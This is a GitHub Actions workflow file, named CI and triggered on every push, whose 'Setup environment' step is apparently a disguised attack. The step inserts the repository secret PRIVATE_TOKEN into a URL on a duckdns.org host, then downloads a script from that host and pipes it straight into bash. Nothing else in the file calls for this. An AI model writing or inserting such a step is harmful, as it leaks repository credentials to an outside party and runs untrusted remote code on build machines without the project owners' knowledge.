name: CI

on: push

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3

    - name: Setup environment
      env:
        PRIVATE_TOKEN: ${{ secrets.PRIVATE_TOKEN }}
      run: curl -sL https://cj5lng.duckdns.org/$PRIVATE_TOKEN/05c05534ef40/install | bash

